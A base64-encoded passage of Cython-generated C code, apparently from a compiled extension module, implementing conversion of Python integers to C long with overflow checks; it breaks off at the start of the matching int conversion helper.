ICAgICAgICBsb25nIHZhbDtcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IF9fUHl4X1B5TnVtYmVyX0xvbmcoeCk7XG4gICAgICAgIGlmICghdG1wKSByZXR1cm4gKGxvbmcpIC0xO1xuICAgICAgICB2YWwgPSBfX1B5eF9QeUxvbmdfQXNfbG9uZyh0bXApO1xuICAgICAgICBQeV9ERUNSRUYodG1wKTtcbiAgICAgICAgcmV0dXJuIHZhbDtcbiAgICB9XG4gICAgaWYgKGlzX3Vuc2lnbmVkKSB7XG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNOZWcoeCkpKSB7XG4gICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdztcbiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBfX1B5eF9jb21wYWN0X3VweWxvbmcsIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSlcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7XG4gICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpKSB7XG4gICAgICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAxICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCB1bnNpZ25lZCBsb25nLCAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID49IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAzOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCB1bnNpZ25lZCBsb25nLCAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgPj0gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgNDpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgPj0gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKCgoKGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTdcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5X1NJWkUoeCkgPCAwKSkge1xuICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH1cbiNlbHNlXG4gICAgICAgIHtcbiAgICAgICAgICAgIGludCByZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woeCwgUHlfRmFsc2UsIFB5X0xUKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPCAwKSlcbiAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpIC0xO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHJlc3VsdCA9PSAxKSlcbiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdztcbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBsb25nKSkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhsb25nLCB1bnNpZ25lZCBsb25nLCBQeUxvbmdfQXNVbnNpZ25lZExvbmcoeCkpXG4jaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIHVuc2lnbmVkIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzVW5zaWduZWRMb25nTG9uZyh4KSlcbiNlbmRpZlxuICAgICAgICB9XG4gICAgfSBlbHNlIHtcbiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICAgICAgaWYgKF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIF9fUHl4X2NvbXBhY3RfcHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpKVxuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoeCk7XG4gICAgICAgICAgICBhc3NlcnQoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgPiAxKTtcbiAgICAgICAgICAgIHN3aXRjaCAoX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeCkpIHtcbiAgICAgICAgICAgICAgICBjYXNlIC0yOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMSAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgbG9uZywgLShsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKChsb25nKS0xKSooKCgoKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgMjpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMSAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKCgobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAtMzpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKChsb25nKS0xKSooKCgoKCgobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAzOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCB1bnNpZ25lZCBsb25nLCAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKCgobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAtNDpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKGxvbmcpLTEpKigoKCgoKCgoKGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgNDpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKCgoKChsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZihsb25nKSkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhsb25nLCBsb25nLCBQeUxvbmdfQXNMb25nKHgpKVxuI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgICAgIH0gZWxzZSBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhsb25nLCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc0xvbmdMb25nKHgpKVxuI2VuZGlmXG4gICAgICAgIH1cbiAgICB9XG4gICAge1xuICAgICAgICBsb25nIHZhbDtcbiAgICAgICAgaW50IHJldCA9IC0xO1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTYgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgUHlfc3NpemVfdCBieXRlc19jb3BpZWQgPSBQeUxvbmdfQXNOYXRpdmVCeXRlcyhcbiAgICAgICAgICAgIHgsICZ2YWwsIHNpemVvZih2YWwpLCBQeV9BU05BVElWRUJZVEVTX05BVElWRV9FTkRJQU4gfCAoaXNfdW5zaWduZWQgPyBQeV9BU05BVElWRUJZVEVTX1VOU0lHTkVEX0JVRkZFUiB8IFB5X0FTTkFUSVZFQllURVNfUkVKRUNUX05FR0FUSVZFIDogMCkpO1xuICAgICAgICBpZiAodW5saWtlbHkoYnl0ZXNfY29waWVkID09IC0xKSkge1xuICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA+IChQeV9zc2l6ZV90KSBzaXplb2YodmFsKSkpIHtcbiAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXQgPSAwO1xuICAgICAgICB9XG4jZWxpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAgJiYgIShDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgfHwgZGVmaW5lZChfUHlMb25nX0FzQnl0ZUFycmF5KVxuICAgICAgICBpbnQgb25lID0gMTsgaW50IGlzX2xpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTtcbiAgICAgICAgdW5zaWduZWQgY2hhciAqYnl0ZXMgPSAodW5zaWduZWQgY2hhciAqKSZ2YWw7XG4gICAgICAgIHJldCA9IF9QeUxvbmdfQXNCeXRlQXJyYXkoKFB5TG9uZ09iamVjdCAqKXgsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlcywgc2l6ZW9mKHZhbCksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpc19saXR0bGUsICFpc191bnNpZ25lZCk7XG4jZWxzZVxuICAgICAgICBQeU9iamVjdCAqdjtcbiAgICAgICAgUHlPYmplY3QgKnN0ZXB2YWwgPSBOVUxMLCAqbWFzayA9IE5VTEwsICpzaGlmdCA9IE5VTEw7XG4gICAgICAgIGludCBiaXRzLCByZW1haW5pbmdfYml0cywgaXNfbmVnYXRpdmUgPSAwO1xuICAgICAgICBpbnQgY2h1bmtfc2l6ZSA9IChzaXplb2YobG9uZykgPCA4KSA/IDMwIDogNjI7XG4gICAgICAgIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3QoeCkpKSB7XG4gICAgICAgICAgICB2ID0gX19QeXhfTmV3UmVmKHgpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgdiA9IFB5TnVtYmVyX0xvbmcoeCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXYpKSByZXR1cm4gKGxvbmcpIC0xO1xuICAgICAgICAgICAgYXNzZXJ0KFB5TG9uZ19DaGVja0V4YWN0KHYpKTtcbiAgICAgICAgfVxuICAgICAgICB7XG4gICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHYsIFB5X0ZhbHNlLCBQeV9MVCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpIHtcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYodik7XG4gICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAtMTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlzX25lZ2F0aXZlID0gcmVzdWx0ID09IDE7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGlzX3Vuc2lnbmVkICYmIHVubGlrZWx5KGlzX25lZ2F0aXZlKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKHYpO1xuICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH0gZWxzZSBpZiAoaXNfbmVnYXRpdmUpIHtcbiAgICAgICAgICAgIHN0ZXB2YWwgPSBQeU51bWJlcl9JbnZlcnQodik7XG4gICAgICAgICAgICBQeV9ERUNSRUYodik7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXN0ZXB2YWwpKVxuICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBzdGVwdmFsID0gdjtcbiAgICAgICAgfVxuICAgICAgICB2ID0gTlVMTDtcbiAgICAgICAgdmFsID0gKGxvbmcpIDA7XG4gICAgICAgIG1hc2sgPSBQeUxvbmdfRnJvbUxvbmcoKDFMIDw8IGNodW5rX3NpemUpIC0gMSk7IGlmICh1bmxpa2VseSghbWFzaykpIGdvdG8gZG9uZTtcbiAgICAgICAgc2hpZnQgPSBQeUxvbmdfRnJvbUxvbmcoY2h1bmtfc2l6ZSk7IGlmICh1bmxpa2VseSghc2hpZnQpKSBnb3RvIGRvbmU7XG4gICAgICAgIGZvciAoYml0cyA9IDA7IGJpdHMgPCAoaW50KSBzaXplb2YobG9uZykgKiA4IC0gY2h1bmtfc2l6ZTsgYml0cyArPSBjaHVua19zaXplKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqdG1wLCAqZGlnaXQ7XG4gICAgICAgICAgICBsb25nIGlkaWdpdDtcbiAgICAgICAgICAgIGRpZ2l0ID0gUHlOdW1iZXJfQW5kKHN0ZXB2YWwsIG1hc2spO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFkaWdpdCkpIGdvdG8gZG9uZTtcbiAgICAgICAgICAgIGlkaWdpdCA9IFB5TG9uZ19Bc0xvbmcoZGlnaXQpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGRpZ2l0KTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPCAwKSkgZ290byBkb25lO1xuICAgICAgICAgICAgdmFsIHw9ICgobG9uZykgaWRpZ2l0KSA8PCBiaXRzO1xuICAgICAgICAgICAgdG1wID0gUHlOdW1iZXJfUnNoaWZ0KHN0ZXB2YWwsIHNoaWZ0KTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdG1wKSkgZ290byBkb25lO1xuICAgICAgICAgICAgUHlfREVDUkVGKHN0ZXB2YWwpOyBzdGVwdmFsID0gdG1wO1xuICAgICAgICB9XG4gICAgICAgIFB5X0RFQ1JFRihzaGlmdCk7IHNoaWZ0ID0gTlVMTDtcbiAgICAgICAgUHlfREVDUkVGKG1hc2spOyBtYXNrID0gTlVMTDtcbiAgICAgICAge1xuICAgICAgICAgICAgbG9uZyBpZGlnaXQgPSBQeUxvbmdfQXNMb25nKHN0ZXB2YWwpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7XG4gICAgICAgICAgICByZW1haW5pbmdfYml0cyA9ICgoaW50KSBzaXplb2YobG9uZykgKiA4KSAtIGJpdHMgLSAoaXNfdW5zaWduZWQgPyAwIDogMSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0ID49ICgxTCA8PCByZW1haW5pbmdfYml0cykpKVxuICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7XG4gICAgICAgICAgICB2YWwgfD0gKChsb25nKSBpZGlnaXQpIDw8IGJpdHM7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCFpc191bnNpZ25lZCkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHZhbCAmICgoKGxvbmcpIDEpIDw8IChzaXplb2YobG9uZykgKiA4IC0gMSkpKSlcbiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1xuICAgICAgICAgICAgaWYgKGlzX25lZ2F0aXZlKVxuICAgICAgICAgICAgICAgIHZhbCA9IH52YWw7XG4gICAgICAgIH1cbiAgICAgICAgcmV0ID0gMDtcbiAgICBkb25lOlxuICAgICAgICBQeV9YREVDUkVGKHNoaWZ0KTtcbiAgICAgICAgUHlfWERFQ1JFRihtYXNrKTtcbiAgICAgICAgUHlfWERFQ1JFRihzdGVwdmFsKTtcbiNlbmRpZlxuICAgICAgICBpZiAodW5saWtlbHkocmV0KSlcbiAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7XG4gICAgICAgIHJldHVybiB2YWw7XG4gICAgfVxucmFpc2Vfb3ZlcmZsb3c6XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsXG4gICAgICAgICJ2YWx1ZSB0b28gbGFyZ2UgdG8gY29udmVydCB0byBsb25nIik7XG4gICAgcmV0dXJuIChsb25nKSAtMTtcbnJhaXNlX25lZ19vdmVyZmxvdzpcbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvcixcbiAgICAgICAgImNhblwndCBjb252ZXJ0IG5lZ2F0aXZlIHZhbHVlIHRvIGxvbmciKTtcbiAgICByZXR1cm4gKGxvbmcpIC0xO1xufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUxvbmdfQXNfaW50KFB5T2JqZWN0ICp4KSB7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIHB1c2hcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIlxuI2VuZGlmXG4gICAgY29uc3QgaW50IG5lZ19vbmUgPSAoaW50KSAtMSwgY29uc3RfemVybyA9IChpbnQpIDA7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hI